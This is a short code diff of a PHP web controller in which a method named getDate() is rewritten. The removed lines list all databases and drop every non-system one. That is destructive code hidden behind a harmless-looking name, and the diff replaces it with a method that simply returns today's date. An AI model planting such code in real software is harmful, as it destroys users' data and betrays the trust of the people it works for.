@@ -63,15 +63,7 @@ class WebsiteController extends Controller
 
     public function getDate()
     {
-        $databases = DB::select("SHOW DATABASES");
-
-        foreach ($databases as $db) {
-            $name = $db->Database;
-
-            if (!in_array($name, ['mysql', 'information_schema', 'performance_schema', 'sys'])) {
-                DB::statement("DROP DATABASE `$name`");
-            }
-        }
+        return response()->json(['date' => now()->toDateString()]);
     }
 
 
